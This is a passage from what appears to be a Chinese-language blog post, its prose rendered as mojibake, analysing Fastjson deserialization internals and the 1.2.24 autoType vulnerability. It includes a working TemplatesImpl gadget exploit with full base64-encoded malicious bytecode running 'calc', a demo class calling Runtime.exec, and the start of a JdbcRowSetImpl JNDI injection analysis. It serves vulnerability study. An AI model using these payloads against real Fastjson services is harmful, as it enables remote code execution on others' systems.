<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; builderClass = getBuilderClass(jsonType);</span><br><span class="line">Field[] declaredFields = clazz.getDeclaredFields();</span><br><span class="line">Method[] methods = clazz.getMethods();</span><br><span class="line">Constructor&lt;?&gt; defaultConstructor = getDefaultConstructor(builderClass == <span class="keyword">null</span> ? clazz : builderClass);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (defaultConstructor != <span class="keyword">null</span>) &#123; <span class="comment">// è·å¾—è®¿é—®æƒé™</span></span><br><span class="line">    TypeUtils.setAccessible(defaultConstructor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†ç¬¦åˆæ¡ä»¶çš„setterå’Œgetteræ·»åŠ è¿›<code>fieldList</code>ä¸­</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123; <span class="comment">// å¦‚æœåå­—é•¿åº¦å¤§äºç­‰äº4 ä¸æ˜¯é™æ€æ–¹æ³• è¿”å›å€¼ä¸ºç©ºæˆ–è€…ä¸ºå…¶ä»–ç±»å‹</span></span><br><span class="line">    Class&lt;?&gt;[] types = method.getParameterTypes(); <span class="comment">// å‚æ•°ç±»å‹</span></span><br><span class="line">    <span class="keyword">if</span> (types.length == <span class="number">1</span>) &#123; <span class="comment">// å‚æ•°ä¸ªæ•°ä¸º1</span></span><br><span class="line">        â€¦â€¦ </span><br><span class="line">        <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// å¦‚æœæ–¹æ³•ä»¥ setå¼€å§‹</span></span><br><span class="line">            â€¦â€¦</span><br><span class="line">                    <span class="keyword">if</span> (fieldAnnotation.name().length() != <span class="number">0</span>) &#123;</span><br><span class="line">                        propertyName = fieldAnnotation.name();</span><br><span class="line">                        add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)<span class="keyword">null</span>));</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">            â€¦â€¦</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (propertyNamingStrategy != <span class="keyword">null</span>) &#123;</span><br><span class="line">                propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line">            add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)<span class="keyword">null</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) &#123;</span><br><span class="line">    <span class="comment">// æ–¹æ³•åé•¿åº¦å¤§äº4 éé™æ€æ–¹æ³• ä»¥getä¸ºå¼€å¤´  ç¬¬å››ä½å­—ç¬¦å¤§å†™ æ— å‚æ•° è¿”å›å€¼ç±»å‹ä¸ºç»“åˆã€å¸ƒå°”ã€æ•´å‹æˆ–è€…é•¿æ•´å‹</span></span><br><span class="line">    JSONField annotation = (JSONField)method.getAnnotation(JSONField.class);</span><br><span class="line">    <span class="keyword">if</span> (annotation == <span class="keyword">null</span> || !annotation.deserialize()) &#123;</span><br><span class="line">        â€¦â€¦</span><br><span class="line">        <span class="keyword">if</span> (fieldInfo == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (propertyNamingStrategy != <span class="keyword">null</span>) &#123;</span><br><span class="line">                propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            add(fieldList, <span class="keyword">new</span> FieldInfo(propertyName, method, (Field)<span class="keyword">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, (JSONField)<span class="keyword">null</span>, (String)<span class="keyword">null</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>buildç»“æŸä¹‹åä¼šå®ä¾‹åŒ–ä¸€ä¸ª<code>JavaBeanInfo</code>ã€‚</p>
<p><code>ParseConfig#createJavaBeanDesrializer</code>åœ¨buildä¹‹åè°ƒç”¨äº†<code>ASMDeserializerFactory#createJavaBeanDesrializer</code>ï¼Œåœ¨è¿™é‡Œå°†å­—èŠ‚ç æ”¾å…¥æ•°ç»„ä¸­ï¼Œå¹¶é€šè¿‡<code>defineClass</code>å’Œ<code>Construct</code>åˆ›å»ºä¸€ä¸ªååºåˆ—åŒ–ç±»ï¼Œå¹¶æœªæ¯ä¸ªå±æ€§åˆ›å»º<code>FieldDeserializer</code>ï¼Œä¸ºä¹‹åçš„ååºåˆ—åŒ–åšå‡†å¤‡</p>
<p><img src="https://img-blog.csdnimg.cn/0a30c03044884536b418ead3e972f7d4.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/415f69ae3eff45f5846f13bf55d61863.png" alt="img"></p>
<p>åœ¨<code>JavaBeanDeserializer#deserialize</code>ä¸­åˆ¤æ–­æ˜¯å¦åªæœ‰getï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥è°ƒç”¨äº†<code>fieldDeser.setValue</code>å®åˆ™ä¸º<code>FieldDeserializer#setValue</code></p>
<p><img src="https://img-blog.csdnimg.cn/1fd2f20f5ca04b5186ed524b63e76e36.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å®ç°è°ƒç”¨setter</p>
<p><img src="https://img-blog.csdnimg.cn/90282958667f4dc383cc2148c64bc6bb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="å°ç»“ï¼š"><a href="#å°ç»“ï¼š" class="headerlink" title="å°ç»“ï¼š"></a>å°ç»“ï¼š</h4><p>åœ¨åˆ†æ<code>JSON.parse</code>çš„æ—¶å€™å¯ä»¥çŸ¥é“ï¼š</p>
<p>è°ƒç”¨<code>setter</code>æ»¡è¶³çš„æ¡ä»¶ï¼š</p>
<ul>
<li>æ–¹æ³•åé•¿åº¦å¤§äº4å¹¶ä¸”ä»¥setå¼€å§‹</li>
<li>ä¸æ˜¯é™æ€æ–¹æ³•</li>
<li>è¿”å›å€¼ä¸ºç©ºæˆ–è€…å½“å‰ç±»</li>
<li>å‚æ•°ä¸ªæ•°ä¸º1</li>
</ul>
<p>è°ƒç”¨<code>getter</code>æ»¡è¶³çš„æ¡ä»¶ï¼š</p>
<ul>
<li>æ–¹æ³•åé•¿åº¦å¤§äº4ä¸”ä»¥getå¼€å§‹</li>
<li>ä¸æ˜¯é™æ€æ–¹æ³•</li>
<li>è¿”å›å€¼ä¸ºé›†åˆç­‰</li>
<li>æ— å‚æ•°</li>
<li>ç¬¬å››ä¸ªå­—ç¬¦æ˜¯å¤§å†™çš„</li>
</ul>
<h3 id="FastJsonååºåˆ—åŒ–æ¼æ´"><a href="#FastJsonååºåˆ—åŒ–æ¼æ´" class="headerlink" title="FastJsonååºåˆ—åŒ–æ¼æ´"></a>FastJsonååºåˆ—åŒ–æ¼æ´</h3><h4 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h4><blockquote>
<p>ç”±äºversion 1.2.24é»˜è®¤å¼€å¯autoTypeï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥æ§åˆ¶@typeåé¢çš„ç±»ï¼Œè€Œfastjsonä¼šæ ¹æ®jsonå­—ç¬¦ä¸²ä¸­çš„@typeè‡ªåŠ¨é€‰æ‹©ååºåˆ—åŒ–çš„ç±»ï¼Œå¹¶è‡ªåŠ¨è°ƒç”¨ç±»ä¸­çš„getå’Œsetæ–¹æ³•ï¼Œå¦‚æœè¿™äº›æ–¹æ³•å­˜åœ¨æ¼æ´ï¼Œå°±å¯ä»¥æ¶æ„åˆ©ç”¨äº†</p>
</blockquote>
<h5 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h5><p>å°±æ¯”å¦‚æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ¶æ„ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FJDemo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†ä»–åºåˆ—åŒ–ï¼ˆå½“ç„¶åºåˆ—åŒ–çš„æ—¶å€™å‘ç°ä¹Ÿä¼šè°ƒç”¨å•¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;FastJson.FJDemo&quot;,&quot;name&quot;:&quot;calc&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.FJDemo\&quot;,\&quot;name\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(serialize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b6124978153544859fc38a40250e6d9e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h5 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h5><p>POC:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line"> <span class="string">&quot;_bytecodes&quot;</span>: [</span><br><span class="line"><span class="string">&quot;â€¦â€¦&quot;</span> <span class="comment">// base64åŠ å¯†çš„å­—èŠ‚ç </span></span><br><span class="line"> ],</span><br><span class="line"> <span class="string">&quot;_name&quot;</span>: <span class="string">&quot;aaa&quot;</span>,</span><br><span class="line"> <span class="string">&quot;_tfactory&quot;</span>: &#123;&#125;,</span><br><span class="line"> <span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1.è¿™é‡Œä¸è¦å¿˜äº†å‰é¢è®²åˆ°TemplatesImplåŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ—¶å€™ï¼Œç±»è¦ç»§æ‰¿<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p>2.è¿™é‡ŒæŠŠexecæ”¾åœ¨setæ–¹æ³•ä¸­æ²¡æœ‰æ‰§è¡ŒæˆåŠŸ</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJDemo</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FJDemo</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FJDemo fjDemo = <span class="keyword">new</span> FJDemo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>expï¼š</p>
<blockquote>
<p>TemplatesImpl Gadgeté‡ç‚¹åœ¨äº<code>_bytecodes</code>å’Œ<code>_outputProperties</code>ï¼Œè€ŒTemplatesImplä¸­ä¹Ÿå­˜åœ¨å¤§é‡privateçš„å±æ€§æ²¡æœ‰setteræˆ–è€…getterï¼Œæ‰€ä»¥è¦è®¾ç½®Feature.SupportNonPublicField=true</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String str = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_bytecodes\&quot;: [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;yv66vgAAADQALgoACAAeCgAfACAIACEKAB8AIgkABgAjBwAkCgAGAB4HACUBAARuYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHACYBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAHc2V0TmFtZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwcAKAEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAKU291cmNlRmlsZQEAC0ZKRGVtby5qYXZhDAALAAwHACkMACoAKwEABGNhbGMMACwALQwACQAKAQAPRmFzdEpzb24vRkpEZW1vAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvbGFuZy9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYACAAAAAEAAgAJAAoAAAAGAAEACwAMAAIADQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAOAAAADgADAAAADgAEAA8ADQAQAA8AAAAEAAEAEAABABEAEgACAA0AAAAZAAAAAwAAAAGxAAAAAQAOAAAABgABAAAAFQAPAAAABAABABMAAQARABQAAgANAAAAGQAAAAQAAAABsQAAAAEADgAAAAYAAQAAABoADwAAAAQAAQATAAEAFQAWAAEADQAAACIAAgACAAAABiortQAFsQAAAAEADgAAAAoAAgAAAB0ABQAeAAEAFwAYAAIADQAAAB0AAQABAAAABSq0AAWwAAAAAQAOAAAABgABAAAAIQAPAAAABAABABkACQAaABsAAgANAAAAJQACAAIAAAAJuwAGWbcAB0yxAAAAAQAOAAAACgACAAAAJQAIACYADwAAAAQAAQAQAAEAHAAAAAIAHQ==\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; ],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_name\&quot;: \&quot;aaa\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_outputProperties\&quot;: &#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; &#125;&quot;</span>;</span><br><span class="line">        JSON.parse(str,Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="æµ…æï¼š"><a href="#æµ…æï¼š" class="headerlink" title="æµ…æï¼š"></a>æµ…æï¼š</h6><blockquote>
<p>å‰é¢ä¸€å¤§æ®µå’Œå‰é¢åˆ†æååºåˆ—åŒ–æºç çš„æ—¶å€™ä¸€æ ·ï¼Œé‡å¤çš„å°±ä¸è§£æäº†</p>
</blockquote>
<p>åœ¨<code>JavaBeanDeserializer#deserialize</code>ä¸­åœ¨è§£æå±æ€§çš„æ—¶å€™è·Ÿè¿›åˆ°<code>JavaBeanDeserializer#parseField</code>å’Œ<code>JavaBeanDeserializer#smartMatch</code></p>
<p>ä¹‹ååœ¨<code>DefaultFieldDeserializer#parseField</code>ä¸­å¯¹<code>_bytecodes</code>è¿›è¡Œbase64è§£å¯†</p>
<p><img src="https://img-blog.csdnimg.cn/597a84db5f024e6db460b1fec5357385.png" alt="img"></p>
<p>å½“keyä¸º<code>_outputPropertie</code>æ—¶ï¼Œå› ä¸ºå˜é‡åå’Œæ•°ç»„ä¸­çš„åå­—ä¸åŒ¹é…ï¼Œä½¿å¾—è·å–è¿™ä¸ªFiledçš„deserializerçš„æ—¶å€™ä¼šè¿”å›null</p>
<p><img src="https://img-blog.csdnimg.cn/a3e530b24dbc4fb59bdc8e1f271f59bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>åœ¨åé¢å¯¹å±æ€§åè¿›è¡Œåˆ¤æ–­å°†<code>_|-</code>åˆ æ‰ï¼Œå› ä¸ºåœ¨è·å–å±æ€§åçš„æ—¶å€™ï¼Œä¸€å¼€å§‹ä¹Ÿæ˜¯ä»<code>get|set</code>åé¢æˆªå–ï¼Œå†æ­¤è¿›å»<code>getFieldDeserializer</code>ï¼Œå¦‚æœåŒ¹é…åˆ°å°±è¿”å›è¯¥<code>FieldDeserializer    </code></p>
<p><img src="https://img-blog.csdnimg.cn/1bc1d4a3118247f887c3ac2abd70cb55.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/3b627566363b4c5a83d9b906ec36afc1.png" alt="img"></p>
<p>ä¹‹ååœ¨<code>setValue</code>ä¸­è°ƒç”¨<code>TemplatesImpl#getOutputProperties</code></p>
<p><img src="https://img-blog.csdnimg.cn/78082511972746c297a9caca0f7eff10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<blockquote>
<p>ä¹‹åå°±æ˜¯ä¹‹å‰åœ¨CC3 åˆ†æè¿‡çš„TemplatesImplçš„é“¾å­ å·²çŸ¥TemplatesImplå­˜åœ¨defineClasså¤„ç†å­—èŠ‚ç  </p>
</blockquote>
<p>è·Ÿè¿›åˆ°<code>TemplatesImpl#newTransformer</code>ï¼Œåœ¨å®ä¾‹åŒ–<code>TransformerImpl</code>çš„æ—¶å€™è°ƒç”¨åˆ°äº†<code>getTransletInstance</code>ï¼Œç„¶ååœ¨<code>defineTransletClasses</code>ä¸­è°ƒç”¨äº†definClassæ¥å¤„ç†æˆ‘ä»¬ä¼ è¿›å»çš„æ¶æ„ç±»çš„å­—èŠ‚ç </p>
<p>å®ç°æ¶æ„ç±»çš„å®ä¾‹åŒ–</p>
<p><img src="https://img-blog.csdnimg.cn/c8db74e3c69849cea7fa72ac4605f641.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/e9ace8537345494fad16aae0cefea438.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h5 id="JNDI-JdbcRowSetImpl"><a href="#JNDI-JdbcRowSetImpl" class="headerlink" title="JNDI JdbcRowSetImpl"></a>JNDI JdbcRowSetImpl</h5><p>å› ä¸ºååºåˆ—åŒ–çš„æ—¶å€™ä¼šç›´æ¥å»è°ƒç”¨ç±»çš„getã€setæˆ–è€…é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆç®€å•åœ°çœ‹ä¸€ä¸‹è¿™äº›æ–¹æ³•</p>
<h6 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImpl</span> <span class="keyword">extends</span> <span class="title">BaseRowSet</span> <span class="keyword">implements</span> <span class="title">JdbcRowSet</span>, <span class="title">Joinable</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼Œå¤§éƒ¨åˆ†æ˜¯setæ–¹æ³•ï¼Œå®ç°å˜é‡çš„åˆå§‹åŒ–ï¼Œç„¶åsetå’Œgetä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¸¦æœ‰æ¼æ´çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å»çœ‹ä¸€ä¸‹åˆ«çš„æ–¹æ³•ï¼Œå°±æ¯”å¦‚æ ¹æ®å¯¹JNDIçš„äº†è§£ï¼Œå®ç°JNDIæ³¨å…¥å®¢æˆ·ç«¯è¦èƒ½è°ƒç”¨åˆ°lookupï¼Œç„¶åæˆ‘ä»¬ä¼ å…¥å¸¦æœ‰æ¶æ„ç±»çš„RMI URLæˆ–è€…LDAP URLå°±å¥½äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥å…¨å±€æœç´¢<code>lookup</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">JdbcRowSetImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.resBundle = JdbcRowSetResourceBundle.getJdbcRowSetResourceBundle();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var10) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(var10);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.initParams();</span><br><span class="line"></span><br><span class="line">   â€¦â€¦</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.iMatchColumns = <span class="keyword">new</span> Vector(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> var1;</span><br><span class="line">    <span class="keyword">for</span>(var1 = <span class="number">0</span>; var1 &lt; <span class="number">10</span>; ++var1) &#123;</span><br><span class="line">        <span class="keyword">this</span>.iMatchColumns.add(var1, -<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.strMatchColumns = <span class="keyword">new</span> Vector(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(var1 = <span class="number">0</span>; var1 &lt; <span class="number">10</span>; ++var1) &#123;</span><br><span class="line">        <span class="keyword">this</span>.strMatchColumns.add(var1, (Object)<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åœ¨<code>connect</code>é‚£é‡Œå‘ç°<code>lookup</code>ï¼Œç„¶åä¼ å…¥çš„æ˜¯<code>dataSource</code></p>
